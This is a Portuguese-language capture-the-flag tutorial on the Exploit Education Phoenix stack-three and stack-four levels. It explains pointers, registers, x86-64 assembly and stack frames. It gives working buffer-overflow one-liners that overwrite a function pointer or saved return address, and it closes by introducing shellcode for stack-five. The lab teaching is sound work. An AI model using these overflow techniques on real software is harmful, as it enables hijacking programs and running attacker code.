<p>A variável &quot;a&quot; é um pointer que armazena a localização da variavel &quot;b&quot;. Coloquialmente se diz que: &quot;a&quot; está apontando para &quot;b&quot; (seta vermelha).</p>
<blockquote>
<p>&quot;a&quot; armazena uma referencia á &quot;b&quot; !</p>
</blockquote>
<blockquote>
<p>&quot;a&quot; pode ser des-referenciada, isto é: Seguir a direção que &quot;a&quot; aponta, para chegar no valor de &quot;b&quot; ! :D</p>
</blockquote>
<p>Normalmente, o caractere &quot;&amp;&quot; indica uma referência, e o caractere &quot;*&quot; desreferencia aquele pointer.</p>
<blockquote>
<p>Caso você tente desrefenciar um pointer que não aponta pra nada (NULL),
o programa vai interromper a execução e soltar uma mensagem de erro!
Ou vai ser classificado como &quot;comportamento indefinido&quot;! Por isso, você vai ver &quot;Null Checks&quot; 
bem frequentemente nesses desafios e em programas em geral!</p>
</blockquote>
<h3><a class="header" href="#-function-pointers" id="-function-pointers">🦀 Function Pointers</a></h3>
<blockquote>
<p>Function pointers, ao envés de armazenar o endereço de uma variável, armazenam o endereço de uma função! :D</p>
</blockquote>
<p>Sim! Funções também são armazenadas na Stack, e possuem seu endereço! Esse endereço pode ser encontrado por varios métodos:</p>
<pre><code>objdump -d &lt;programa&gt; | grep &lt;nome_da_função&gt;


gdb &lt;programa&gt;
  (gdb)&gt; info functions
</code></pre>
<p>Os dois metodos serão demonstrados em breve! :D</p>
<h3><a class="header" href="#-exploit" id="-exploit">🔥 Exploit</a></h3>
<blockquote>
<p>Buffer overflow, alterarando o valor de um function pointer, redirecionando a execução do programa.</p>
<p>Em lingua não nerd, por favor? :P</p>
<p>O valor que sera corrompido pelo buffer overflow indica aonde a execução do programa esta indo. Se controlamos esse valor, controlamos aonde o programa vai!</p>
</blockquote>
<h4><a class="header" href="#-analisando-o-programa" id="-analisando-o-programa">🛸 Analisando o programa</a></h4>
<pre><code class="language-C">função complete_level() {   // a função que a gente quer chamar
.......
}

função main() {
  criar buffer[64];
  criar fp; // um function pointer
  
  fp = NULL; // vai ser usado para checar se ele foi alterado,
               // se continuar sendo NULL, quer dizer que esta intacto.
                
  
  gets(buffer) // função INSEGURA para abrir um input
  
  if (fp) {    // se fp foi alterado
    fp()   // chama o endereço salvo em fp como se fosse uma função
  } else {
    print(valor nao alterado, tente novamente)
  }
  
  exit
}
</code></pre>
<p>Nós queremos chamar <code>complete_level()</code>, para isso, faremos <code>fp</code> salvar o seu endereço.</p>
<p>E nós já sabemos como exploitar um <code>gets()</code> para alterar os valores depois do <code>buffer</code>! Então tá na hora do trabalho!</p>
<h4><a class="header" href="#-encontrando-o-endereço-da-função" id="-encontrando-o-endereço-da-função">🏠 Encontrando o endereço da função</a></h4>
<pre><code>objdump -d    // Resumindo, printa pro terminal os objetos armazenados na Stack e seus endereços
                  ( O -d é pra ativar a disassembly: Converter de machine code para algo legivel )!
gdb
</code></pre>
<p>objdump</p>
<pre><code>$ objdump -d /opt/phoenix/amd64/stack-three | grep complete_level
000000000040069d &lt;complete_level&gt;:
</code></pre>
<p>gdb</p>
<pre><code class="language-x86asm">$ gdb /opt/phoenix/amd64/stack-three                
---- Mensagens padrão foram removidas ----
(gdb) info functions 
All defined functions:

Non-debugging symbols:
0x00000000004004b0  _init
0x00000000004004d0  printf@plt
0x00000000004004e0  gets@plt
0x00000000004004f0  puts@plt
0x0000000000400500  fflush@plt
0x0000000000400510  exit@plt
0x0000000000400520  __libc_start_main@plt
0x0000000000400530  _start
0x0000000000400546  _start_c
0x0000000000400570  deregister_tm_clones
0x00000000004005a0  register_tm_clones
0x00000000004005e0  __do_global_dtors_aux
0x0000000000400670  frame_dummy
0x000000000040069d  complete_level              // Mesmo endereço
0x00000000004006b5  main
0x0000000000400740  __do_global_ctors_aux
0x0000000000400782  _fini
</code></pre>
<blockquote>
<p>O endereço da função é 0x000000000040069d ! :D</p>
</blockquote>
<p>Presta atenção na quantidade de null bytes que precedem o endereço. Todo pointer começa com pelo menos dois null bytes, 
e strings terminam com 1 null byte!</p>
<p>Assim, impedindo atacantes (nós), de definir um pointer novo, pois quebraria a string do nosso 
input. Nós precisamos usar um que já esta na memoria! (  Spoiler hehehehe :D  )</p>
<p>Como nesse desafio o pointer ja existe (<code>fp</code>) e nós só vamos mudar os bytes finais dele
(Inteiro escreve na direção LE, lembra? Então não vai inteferir com os NULLs que vem antes)</p>
<p>Portanto não precisamos nos preocupar com isso nesse desafio!</p>
<h4><a class="header" href="#-cansei-de-teoria-eu-quero-exploit" id="-cansei-de-teoria-eu-quero-exploit">😐 Cansei de teoria eu quero exploit</a></h4>
<p>Se você quer tentar por conta propria, agora é sua hora de brilhar!</p>
<pre><code>Lembretes:
Little Endian, o buffer tem 64 bytes,
b&quot;\x&quot;, e o input vem pelo gets()
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
eai, brilhou? ;)
</code></pre>
<p>O input que vamos passar fica:
b&quot;A&quot;*64     # encher o buffer (<code>padding</code>) <br />
+ <br />
b&quot;\x9d\x06\x40&quot; # 0x40069d vira &quot;9d 06 40&quot; em LE</p>
<p>Então...</p>
<blockquote>
<p>$ python -c &quot;print(b'A'*64 + b'\x9d\x06\x40')&quot;</p>
</blockquote>
<pre><code class="language-C">calling function pointer @ 0x40069d &lt;-- chamando complete_level()
Congratulations, you've finished phoenix/stack-three :-) Well done!
</code></pre>
<p>Espero que você tenha gostado! :D</p>
<h1><a class="header" href="#-solução-3" id="-solução-3">🔥 Solução</a></h1>
<blockquote>
<p>$ python -c &quot;print(b'A'*64 + b'\x9d\x06\x40')&quot; | /opt/phoenix/amd64/stack-three </p>
</blockquote>
<pre><code>calling function pointer @ 0x40069d
Congratulations, you've finished phoenix/stack-three :-) Well done!
</code></pre>
<h1><a class="header" href="#-objetivo-3" id="-objetivo-3">🎯 Objetivo</a></h1>
<p>O buffer overflow (<code>BOF</code>) vai nos permitir alterar o saved return pointer (<code>SRP</code>) e redirecionar a execução do programa.</p>
<p>Esse desafio está nos preparando para o próximo, no qual nos redirecionaremos a execução para o nosso próprio código, e teremos um exploit de verdade! :D</p>
<p>Esse tipo de exploit era viável nos anos 90, quando mecanismos de proteção não existiam. Por isso é chamado de buffer overflow clássico (ou <code>SRP BOF</code>, 
caso você goste de siglas)! :D</p>
<p>Se você souber inglês, vale a pena dar uma lida nesse post de 1996 no Phrack: <a href="http://phrack.org/issues/49/14.html">Smashing The Stack For Fun And Profit</a> !</p>
<h1><a class="header" href="#-conhecimento-preliminar" id="-conhecimento-preliminar">🛸 Conhecimento preliminar</a></h1>
<p>Se tem uma seção inteira dedicada a conhecimento preliminar, eu posso te garantir que vai ser BASTANTE ! Verifique que o cinto de segurança está firme e travado,
mantenha as mãos, pernas e canecas de café dentro do veículo durante todo o percurso!</p>
<p>3...2...1....</p>
<h2><a class="header" href="#-assembly" id="-assembly">🤖 Assembly</a></h2>
<p>Recursos adicionais: <br />
<a href="https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf&amp;ved=2ahUKEwiPvJn2xvrsAhXIILkGHdA4BNUQFjAAegQIARAB&amp;usg=AOvVaw384MVXQDBtyM1pPW3LeZrW">x64 Cheat Sheet - PDF</a> <br />
<a href="https://cs61.seas.harvard.edu/site/2018/Asm1/">Harvard CS61</a> <br />
<a href="https://en.m.wikipedia.org/wiki/Processor_register">Wikipedia Registers</a> <br />
<a href="https://www.tutorialspoint.com/general-purpose-registers-in-8086-microprocessor#:%7E:text=The%20general%20purpose%20registers%20are,has%20eight%20general%20purpose%20registers.&amp;text=This%20is%20the%20accumulator.,into%20two%208%2Dbit%20registers">GPR in 8086</a><br />
<a href="https://mentebinaria.gitbook.io/engenharia-reversa/assembly/registradores">Registradores - Introdução Engenharia Reversa</a> </p>
<p>Eu pretendo fazer uma serie de tutorias dedicada à assembly (ASM), porém isso é para o futuro...</p>
<p>Eu vou usar sintaxe intel, pq é a melhor e se alguem te disser o contrário, a pessoa ta mentindo &gt;:( !!!!</p>
<blockquote>
<p>ASM é uma representação legivel dos 0s e 1s das instruções do computador.
Ela pode ser transformada em machine code (código de maquina, os 0s e 1s) usando uma ferramenta chamada assembler!</p>
</blockquote>
<p>Então como você pode imaginar, é bem complicado, e a minha maneira de explicar pode não funcionar para você... Então vai com calma, le de outras fontes, assite 
videos,... vai demorar um bom tempo ate ficar intuitivo, e ta tudo bem com isso :) vai no seu ritmo</p>
<h3><a class="header" href="#-register-registros--registradores" id="-register-registros--registradores">📦 Register (Registros / Registradores)</a></h3>
<blockquote>
<p>Registers são pedaços de memória que ficam dentro do chip do processador,
semelhante a memória RAM, porém extremamente rápidos e pequenos.</p>
</blockquote>
<p>O seu tamanho é um dos determinantes da arquitetura (32 bits = register de
4 bytes, 64 bits = register de 8 bytes)</p>
<p>Esses registers são semelhantes à variáveis, no sentido que
armazenam valores, podem ser alterados e lidos.</p>
<h4><a class="header" href="#-general-purpose-registers-gpr--registro-de-propósito-geral-" id="-general-purpose-registers-gpr--registro-de-propósito-geral-">🌍 General Purpose Registers (GPR) ( Registro de Propósito Geral )</a></h4>
<p>Obs: muitos desses podem ser divididos em 2 partes, com metade do tamanho original. Nesse caso, se adiciona o sufixo H (High, A parte de cima) e L (Low, A parte de baixo). </p>
<blockquote>
<p>Por exemplo: AX (16 bits, endereços: 0 a 15) (uma versão antiga do RAX) pode ser dividido em AL (8 bits, do 0 ao 7) e AH (8 bits, do 8 ao 15).</p>
</blockquote>
<p>O propósito deles historicamente costumava ser, mas não exclusivamente era:</p>
<pre><code class="language-x86asm">RAX Acumulador   -&gt; Usado para operações_lógicas ou aritméticas 
RBX              -&gt; Pointer para dados
RCX Contagem     -&gt; Usado em loops e outras operações_cíclicas 
RDX Dados        -&gt; Multiplicação, input/output
R8 a 15          -&gt; você só precisa saber que eles existem
</code></pre>
<p>Alem disso, são usados para passar os argumentos para funções (explicação em breve)</p>
<pre><code class="language-x86asm">RAX (Valor retornado)
RDI (1º parametro)
RSI (2º parametro)
RDX (3º parametro)
...
</code></pre>
<p>Para os nossos proprositos, é mais vantajoso considerar que eles só servem para 
armazenar valores e passar argumentos</p>
<h4><a class="header" href="#-address-register--armazenam-endereços-da-stack-" id="-address-register--armazenam-endereços-da-stack-">💫 Address Register ( armazenam endereços da stack )</a></h4>
<pre><code class="language-x86asm">RSP Stack Pointer       -&gt; Aponta para o topo da stack
RBP Base Pointer        -&gt; Aponta para a base da stack
RIP Instruction Pointer -&gt; Aponta para a instrução 
								que está sendo executada 
</code></pre>
<h4><a class="header" href="#-rflag" id="-rflag">🏁 RFLAG</a></h4>
<p>O register RFLAG armazena flags: sinais que indicam resultados de operações passadas.
Esses sinais são 1 bit (0 ou 1)</p>
<pre><code>Exemplos:

Posição    Nome         Descrição 
0          Carry         Resultado estourou o limite de um inteiro
								sem sinal (o &quot;vai-um&quot; da matemática)
6          Zero          A operação resultou em 0
11         Overflow      Estourou o limite de um inteiro com sinal
</code></pre>
<h4><a class="header" href="#-apêndice---curiosidade--nomenclatura-histórica" id="-apêndice---curiosidade--nomenclatura-histórica">🧠 Apêndice - Curiosidade : Nomenclatura histórica</a></h4>
<p><img src="stack/phoenix/./img/registers.jpeg" alt="Imagem mostrando os registers" /> <br />
Eu vou usar o RAX como exemplo!</p>
<pre><code class="language-x86asm">Em computadores 8 bits, ele era chamado A (Acumulador)
Em computadores 16 bits, ele era chamdo AX (Acumulador eXtendido ) 
Em computadores 32 bits, ele era chamado EAX e tem o tamanho de 2 AX
Em computadores 64 bits, ele é chamado RAX e tem o tamanho de 2 EAX

Para propositos de retro-compatibilidade, nos ainda podemos usar, 
por exemplo, EAX em um computador 64 bits !
Por tras das cenas, o computador interpreta EAX como a segunda metade do RAX

Então não estranhe caso alguem fale de EIP numa
arquitetura x64, pois na linguagem informal não faz diferença

Mas caso você vá analisar o register em um debugger, a diferença importa :D
</code></pre>
<h3><a class="header" href="#-instruções" id="-instruções">⚡ Instruções</a></h3>
<blockquote>
<p>Obs: os registers foram usados aleatoriamente, pois seu propósito na realidade não é relevante para a explicação !</p>
</blockquote>
<p>As instruções são o que o processador executa, por exemplo</p>
<pre><code class="language-x86asm">add 0x4 0x1     -&gt; adição 4 + 1 = 5
</code></pre>
<p>Na sintaxe intel, o &quot;alvo&quot; da operação vem primeiro e o &quot;parâmetro&quot; depois</p>
<p>Caso os dois argumentos da instrução sejam valores, a operação executara normalmente</p>
<p>Caso o <strong>alvo</strong> seja um <strong>register</strong>, o <strong>resultado</strong> da operação será salvo nele </p>
<pre><code class="language-x86asm">add 0x4 0x1     -&gt; adição 4 + 1 = 5
add rbp 0x10    -&gt; rbp  vira  rbp + 0x10
add rbp 0x22    -&gt; Adiciona 0x22 ao rbp 
</code></pre>
<pre><code class="language-x86asm">sub 0x4 0x1     -&gt; subtração 4 - 1 = 3
                 Caso fosse ao contrário a ordem &quot;alvo&quot; &quot;parâmetro&quot;,
                 o resultado seria `-3` !
                 
sub rbp 0x10    -&gt; rbp  vira  rbp - 0x10
sub rsp 0x10    -&gt; Subtrai 0x10 de rsp
</code></pre>
<p>Algumas outras instruções que serão importantes</p>
<pre><code class="language-x86asm">push -&gt; Empurra o valor pro topo da Stack

pop  -&gt; Tira o valor no topo da Stack e salva no alvo
     |---&gt; pop      -&gt; Só remove o valor no topo da Stack
     |---&gt; pop rbp  -&gt; Remove o valor do topo e salva em rbp
      
mov  -&gt; Move o valor do parâmetro para o alvo
     |---&gt; mov rbx 0x10   -&gt; O valor de rbx vira 0x10
     |---&gt; mov rbx rax    -&gt; O valor de rbx vira o valor de rax
     |---&gt; mov rax rbx    -&gt; O valor de rax vira o valor de rbx

Usadas no epílogo ( explicadas em breve )
           ret     -&gt; retorna da função ( em essência é só um &quot;pop rip&quot; )
           leave -&gt; restaura o stack frame anterior ( mov rsp rbp ; pop rbp )

xor, and, ......  -&gt; Operadores lógicos, têm o mesmo comportamento de sub e add
                  |---&gt; and rbp 0x10   -&gt; rbp  vira  rbp &amp; 0x10
                  |---&gt; xor rsp 0x10   -&gt; rsp  vira  rsp ^ 0x10

Jumps/Pulos
jmp 0x00001234 -&gt; Move o RIP para aquela localização incondicionalmente,
			equivalente a um GOTO

test rax 0x1 ; jmpEQ 0x00001234 -&gt; jmp equal
             |---&gt; Compara os valores; Se forem iguais da o jump
			 (normalmente usado em conjunto com a ZERO_FLAG)

jmple  -&gt; jmp less or equal   -&gt; Menor ou igual   ≤
jmpge -&gt; jmp greater or equal -&gt; Maior ou igual   ≥
</code></pre>
<p>Caso vc não saiba os operadores lógicos: <a href="https://pt.wikipedia.org/wiki/Operador_l%C3%B3gico">Wikipedia Operador Lógico</a></p>
<h3><a class="header" href="#-funções-prólogo-e-epílogo" id="-funções-prólogo-e-epílogo">🦄 Funções, Prólogo e Epílogo</a></h3>
<p>Agora tá na hora de aprender <strong>realmente</strong> como essa tal de stack funciona, então é bom dar uma revisada, né?</p>
<h4><a class="header" href="#-revisão" id="-revisão">☕ Revisão</a></h4>
<pre><code>- A stack é como uma pilha de pratos: último a entrar, primeiro a sair (LIFO)
- Ela cresce para valores menores: 
    - A memória é representada de cabeça pra baixo!
    - A base fica em um endereço maior (parte de baixo)
    - O topo fica em um endereço menor (parte de cima)
    - Portanto, a stack cresce em direção à valores menores :D 

</code></pre>
<h4><a class="header" href="#-stack-frame--moldura-da-stack-" id="-stack-frame--moldura-da-stack-">🖼️ Stack Frame ( Moldura da Stack )</a></h4>
<p>Você se lembra do RBP e RSP la da parte dos register? Eles ficam importantes agora! :D</p>
<p>O rbp indica a base da stack, e rsp o topo.</p>
<p>A região entre os dois é chamada de stack frame: um pedaço da stack :D</p>
<p>A stack como um todo possui vários stack frames, porém só um está ativo por vez (o indicado pelo rbp/rsp).</p>
<p>Para poder criar um novo ou destruir um antigo, existem procedimentos chamados Prólogo e Epílogo, respectivamente.</p>
<blockquote>
<p>Obs: Quando você muda o tamanho da stack por push/pop, o RSP se ajusta automaticamente </p>
</blockquote>
<p>Quando chamamos uma <strong>função()</strong>, precisamos criar um frame novo para ela por meio de um Prólogo, e salvar o endereço do frame atual. Ao retornar, esse frame será destruído com um Epílogo e o antigo será restaurado !</p>
<p>Para a explicação, vamos usar o seguinte pseudo-programa:</p>
<pre><code class="language-C">Fn print_dois(x, y) {
    print(x)
    print(y)

    return
}
Fn main() {
    x = &quot;Ola! :D&quot;
    y = &quot;Assembly é legal&quot;

    print_dois(x, y)

    return
}
</code></pre>
<p>Agora vamos executar <strong>main()</strong>, <strong>x</strong> e <strong>y</strong> são definidas e nos já sabemos como isso funciona, agora vamos chamar a função, que é aonde a mágica acontece !</p>
<h4><a class="header" href="#-prólogo" id="-prólogo">🔒 Prólogo</a></h4>
<ul>
<li>Se a função recever argumentos, passar eles
Chamar a função </li>
<li>Salvar o frame atual</li>
<li>Criar novo frame
Executar a função</li>
</ul>
<h5><a class="header" href="#se-a-função-receber-argumentos-salvar-eles" id="se-a-função-receber-argumentos-salvar-eles">Se a função receber argumentos, salvar eles</a></h5>
<p>Algumas arquiteturas passam os argumentos pela stack, salvando-os na stack na ordem inversa:</p>
<pre><code class="language-x86asm">(x, y)
push y
push x
</code></pre>
<p>Mas comumente, os argumentos são passados pelos registers:</p>
<pre><code class="language-x86asm">RAX (Valor retornado)
RDI (1º parametro)
RSI (2º parametro)
RDX (3º parametro)
...
</code></pre>
<blockquote>
<p>Caso <strong>main()</strong> use um desses registers para armazenar dados para uso futuro, vai ser nescessário dar um push neles, e restaura-los no epilogo </p>
</blockquote>
<h4><a class="header" href="#salvar-o-frame-atual" id="salvar-o-frame-atual">Salvar o frame atual</a></h4>
<pre><code class="language-x86asm">push RIP + 0x4 ; salva o RIP na stack, porém não o valor atual,
	       ; e sim o endereço da próxima instrução 
push RBP       ; salva o RBP
</code></pre>
<p>Atualmente, a stack está assim</p>
<pre><code class="language-x86asm">rbp main            &lt;- RSP   -
rip main                     | Frame de
....                         | main()
ret de main         &lt;- RBP   -
</code></pre>
<h4><a class="header" href="#criar-novo-frame" id="criar-novo-frame">Criar novo frame</a></h4>
<p>Agora, para criar um novo frame, precisamos subir o rbp até o rsp</p>
<pre><code class="language-x86asm">mov rbp rsp ; Move o valor de rsp para rbp!
            ; Ou melhor : rbp &quot;anda&quot; até o rsp
</code></pre>
<p>Atualmente, a stack está assim</p>
<pre><code class="language-x86asm">rbp main    &lt;- RSP  e RBP apontam para a mesma localizção
rip main                   
... stack frame de main omitido           
</code></pre>
<p>Agora, precisamos <strong>subtrair</strong> de RSP para alocar espaço na memória para essa função </p>
<blockquote>
<p>A stack cresce para valores menores :)</p>
</blockquote>
<pre><code class="language-x86asm">sub rsp - 0x20 ; vamos supor que, para esse exemplo, a função precisa de 32 bytes.
               ; Portanto, vamos subtrair 32 bytes de RSP, para faze-lo &quot;subir&quot;
</code></pre>
<p>Atualmente, a stack está assim</p>
<pre><code class="language-x86asm">...          &lt;- RSP      -
Variaveis de print_dois  |
...                      | Frame de
...                      | print_dois()
rbp main     &lt;- RBP      -
rip main                   
...              
</code></pre>
<p>Com esse método de chamar função, não importa a localização da memória de quando a função foi chamada, ela sempre vai executar da mesma maneira</p>
<blockquote>
<p>Esse processo pode ocorrer muitas vezes caso uma função chame outra, no nosso exemplo, um novo frame seria criado para <strong>print()</strong>, print seria executada,
e o frame destruído ao retornar. Apos <strong>print()</strong> retornar, <strong>print_dois continuara a execução normalmente! :)</strong></p>
</blockquote>
<pre><code class="language-x86asm">O prologo então pode ser resumido em

salvar vars
call
  push rip
  push rbp
  mov rbp rsp
  sub rsp 0x1234
  executar a função
</code></pre>
<h4><a class="header" href="#-epílogo" id="-epílogo">🔑 Epílogo</a></h4>
<p>O epilogo é bem mais simples que o prologo:</p>
<pre><code>- Devolver memoria e restaurar RBP    -&gt; leave   
- Restaurar RIP  e retornar           -&gt; ret
</code></pre>
<p>Atualmente, a stack está assim</p>
<pre><code class="language-x86asm">...          &lt;- RSP      -
Instruções               |
...                      | Frame de
...                      | print_dois()
rbp main     &lt;- RBP      -
rip main                   
            
</code></pre>
<p><strong>leave</strong></p>
<p>Para devolver a memoria, precisamos mover RSP &quot;para baixo: basta dar um <code>mov rsp rbp</code> (&quot;andar&quot; rsp até o rbp)</p>
<p>Atualmente, a stack está assim</p>
<pre><code class="language-x86asm">...                    
Variaveis print dois   A região não é apagada, pois consumiria processamento a toa!
...         O valores ficam largados lá até uma nova função escrever por cima deles..
...         Por isso que, ao analisar a stack, as vezes vemos &quot;lixo&quot; aleatorio
...         Eles pode ser ignorado pois nem está mais na stack
                          
rbp main  &lt;- RBP e RSP - O topo da stack
rip main                                
</code></pre>
<p>Em seguida, vamos restaurar o rbp de main <code>pop rbp</code> (remover o valor no topo da stack (ver acima por referencia), e colocalo no alvo: <strong>rbp</strong>)</p>
<pre><code class="language-x86asm">--- omitido ---
rip main      &lt;- RSP   (lembrando que RSP se ajusta automaticamente com push/pop)
...
... main
call print_dois
proxima instrução
... resto de main
ret de main   &lt;- RBP
</code></pre>
<p><strong>ret (return)</strong>
ret vai restaurar o EIP de main com um <code>pop rip</code></p>
<pre><code class="language-x86asm">...
...resto de main  &lt;- RSP
call print_dois
proxima instrução &lt;- RIP
... resto de main
ret da main       &lt;- RBP
</code></pre>
<p>Assim, o stack frame de main foi restaurado graças ao rbp e rip salvos ( o rip salvo é chamado de <strong>Saved Return Pointer (SRP)</strong> )</p>
<h1><a class="header" href="#-caso-você-tenha-viajado-o-que-você-precisa-saber" id="-caso-você-tenha-viajado-o-que-você-precisa-saber">🌍 Caso você tenha viajado, o que você precisa saber</a></h1>
<p>Existem algumas variaveis especiais dentro do processador:</p>
<pre><code class="language-x86asm">RSP Stack Pointer       -&gt; Aponta para o topo da stack
RBP Base Pointer        -&gt; Aponta para a base da stack
RIP Instruction Pointer -&gt; Aponta para a instrução que está sendo executada 
</code></pre>
<p>O RIP e o RBP atuais são salvos na stack quando chamamos uma função, junto das outras variaveis:</p>
<pre><code class="language-x86asm">buffer[64]
uns int qualquer usado na função
....
rbp
rip
</code></pre>
<p>Se por um buffer overflow conseguimos alterar aqueles inteiros depois do buffer, como <code>changeme</code> nos execicios anteriores, tambem conseguimos 
alterar o RIP salvo (<code>SRP</code>) e redirecionar a execução do programa!</p>
<h1><a class="header" href="#-exploit-1" id="-exploit-1">🔥 Exploit</a></h1>
<h2><a class="header" href="#-analisar-o-programa" id="-analisar-o-programa">🔬 Analisar o programa</a></h2>
<p>O programa contem 3 funções: <code>complete_level</code>, <code>start_level</code> e <code>main</code></p>
<p><code>main</code> printa a mensagem do começo do nivel e chama start_level</p>
<p><code>complete_level</code> é a função que precisamos chamar</p>
<p><code>start_level</code> é onde a magica acontece: <code>gets()</code> (vulneravel) é chamada num <code>buffer[64]</code></p>
<h2><a class="header" href="#-o-compilador-adicionou-coisa" id="-o-compilador-adicionou-coisa">⁉️ O compilador adicionou coisa???</a></h2>
<p>Se colocarmos somente um byte:</p>
<pre><code class="language-bash">$ ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
A
and will be returning to 0x40068d
</code></pre>
<p>A função normalmente retorna para 0x40068d !</p>
<pre><code class="language-bash">$ python -c &quot;print 'A'*80&quot; | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40068d
Segmentation fault
</code></pre>
<p>Nos colocamos mais de 64 bytes (80), e conseguimos dar overflow... mas o rip não mudou e mesmo assim teve seg fault.... QUE?!!!!</p>
<p>O compilador muitas vezes coloca coisas na stack por performance ou compatibilidade!</p>
<p>Alem disso, nos exemplos passados o valor que queremo mudar estava logo depois do buffer, agora tem pelo menos o RBP salvo no meio do caminho!
Então precisamos levar isso em consideração, não basta só olhar que o tamanho do buffer é 64 e colcoar 64 bytes de <code>padding</code>!</p>
<p>Em aplicações mais complexas, essa diferença pode chegar a centenas de bytes.</p>
<p>Nos podemos encontrar essa diferença usando ferramentas como fuzzers ou geradores de padrão...</p>
<p>Como nosso exemplo é simples, podemos aumentar/diminuir manualmente ate encontrar o valor certo:</p>
<pre><code class="language-bash">$ python -c &quot;print 'A'*89&quot; | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x41
Segmentation fault

$ python -c &quot;print 'A'*88&quot; | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x400000
Segmentation fault
</code></pre>
<p>Isso quer dizer que apoś <strong>88</strong> bytes, temos o SRP :D</p>
<h2><a class="header" href="#-encontrar-endereço-de-complete_level" id="-encontrar-endereço-de-complete_level">🏠 Encontrar endereço de complete_level</a></h2>
<p>Você se lembra como faz? Nos usamos no execicio passado....</p>
<blockquote>
<p>cof cof objdump -d cof cof</p>
</blockquote>
<pre><code>Se vc quer tentar sozinhx, agora é a sua hora
.
.
.
.
.
.
.
.
.
.
.
.
.
Eai, conseguiu?
</code></pre>
<p>Encontrar endereço:</p>
<pre><code class="language-x86asm">$ objdump -d stack-four | grep complete_level
000000000040061d &lt;complete_level&gt;:
</code></pre>
<p>Exploit:</p>
<pre><code class="language-bash">$ python -c &quot;print 'A'*88 + '\x1d\x06\x40'&quot; | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40061d
Congratulations, you've finished phoenix/stack-four :-) Well done!
</code></pre>
<p>Esse foi um tutorial beeem longo, e com certeza o mais dificil! Se você chegou até aqui, parabens! :D</p>
<h1><a class="header" href="#-solução-4" id="-solução-4">💫 Solução</a></h1>
<pre><code class="language-bash">$ python -c &quot;print 'A'*88 + '\x1d\x06\x40'&quot; | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40061d
Congratulations, you've finished phoenix/stack-four :-) Well done!
</code></pre>
<h1><a class="header" href="#-objetivo-4" id="-objetivo-4">🎯 Objetivo</a></h1>
<p>Finalmente! Tudo isso para chegar no BOF SRP (classico) :D</p>
<p>Agora ta na hora de redirecionar o pointer para o nosso codigo malicioso (shellcode) para ganhar uma shell </p>
<h1><a class="header" href="#-dicas-1" id="-dicas-1">💡 Dicas</a></h1>
<p>A instrução <code>0xCC</code> (<code>int3</code>) serve para no debugger (como o gdb), para quando o rip chegar nela, a execução pausar (<code>breakpoint</code>). Nos podemos usa-la para testar se
sequer conseguimos executar codigo, ou se o problema ta no shellcode: Se o debugger avisa que teve <code>SIGTRAP</code>, nos temos execução de código :D</p>
<p>Banco de dados de shellcode: <a href="http://shell-storm.org/shellcode/files/">shell-storm</a></p>
<h1><a class="header" href="#-exploit-2" id="-exploit-2">🔥 Exploit</a></h1>
<h2><a class="header" href="#analisando-o-programa" id="analisando-o-programa">Analisando o programa</a></h2>
<p><code>main()</code> printa o banner e chama <code>start_level()</code></p>
<p><code>start_level()</code> cria um buffer[<strong>128</strong>] e salva o output de <code>gets()</code> (<strong>inseguro</strong>)</p>
<p>Como você pode ver, não exite <code>complete_level()</code></p>
<p>Para completar, precisamos executar nosso próprio codigo (<code>shellcode</code>) e conseguir uma shell (uma linha de comando)</p>
<h2><a class="header" href="#agora-em-asm-d-analise-estatica" id="agora-em-asm-d-analise-estatica">Agora em ASM :D (analise estatica)</a></h2>
<p>Normalmente, o gdb printa assim:</p>
<pre><code class="language-x86asm">   0x00000000004005a4 &lt;+0&gt;:	push   rbp
   0x00000000004005a5 &lt;+1&gt;:	mov    rbp,rsp
   0x00000000004005a8 &lt;+4&gt;:	sub    rsp,0x10
</code></pre>
<p>Porem, eu removi os endereços para simplificar, e só mantive os importantes!</p>
<p>Primeiro, vamos ver main</p>
<pre><code class="language-x86asm">gef&gt; disassemble main
push   rbp
mov    rbp,rsp                    &lt;- Prologo
sub    rsp,0x10
   
   
mov    DWORD PTR [rbp-0x4],edi
mov    QWORD PTR [rbp-0x10],rsi   &lt;- args de puts
mov    edi,0x400620
call   0x400400 &lt;puts@plt&gt;        &lt;- call puts
   
   
mov    eax,0x0                    &lt;- args de start_level (nenhum)
call   0x40058d &lt;start_level&gt;     &lt;- call start_level
   
   
mov    eax,0x0                    &lt;- exit code (codigo de saida, 0=sem erro)
leave                             &lt;- Epilogo  
</code></pre>
<p>Agora vamos ver start_level</p>
<pre><code class="language-x86asm">gef&gt; disassemble start_level 
push   rbp
mov    rbp,rsp                  &lt;- Prologo 
add    rsp,0xffffffffffffff80   
                                
   
lea    rax,[rbp-0x80]         &lt;- rax = Pointer para buffer[128]
mov    rdi,rax                &lt;- rdi = rax

0x000000000040059c &lt;+15&gt;:
call   0x4003f0 &lt;gets@plt&gt;    &lt;- call gets


nop
leave                         &lt;- Epilogo
ret
</code></pre>
<p>Agora vamos adicionar um breakpoint!</p>
<h3><a class="header" href="#breakpoint" id="breakpoint">Breakpoint</a></h3>
<blockquote>
<p>Breakpoint = ponto de pausa</p>
</blockquote>
<p>Antes daquela intrução ser executada, sera substituida por <code>0xCC</code>. Isso faz o  debugger pausar a execução do programa naquela instrução!</p>
<p>Quando continuamos executando (normalmente o comando é <strong>continue</strong>), o <code>0xCC</code> é substituido pela instrução certa :D</p>
<p>Se você esta fora de um debugger, <code>0xCC</code> vai fazer o programa sair com erro</p>
<pre><code class="language-x86asm">gef&gt; b *0x000000000040059c
Breakpoint 1 at 0x40059c
</code></pre>
<p>&quot;b&quot; é o comando do gdb para adionar um breakpoint \ 
A &quot;*&quot; tem haver com aquele dos pointers \ 
O endereço é para &quot;<code>call gets</code>&quot;</p>
<blockquote>
<p>Dica: se você selecionar/sublinhar (clique esquerdo e passa o mouse em cima, você sabe do que eu to falando), e clicar o botão do meio no mouse (a rodinha) 
o terminal automaticamente da Ctrl-C Ctrl-V naquele valor para você! Então não precisa copiar o endereço manualmente :D</p>
</blockquote>
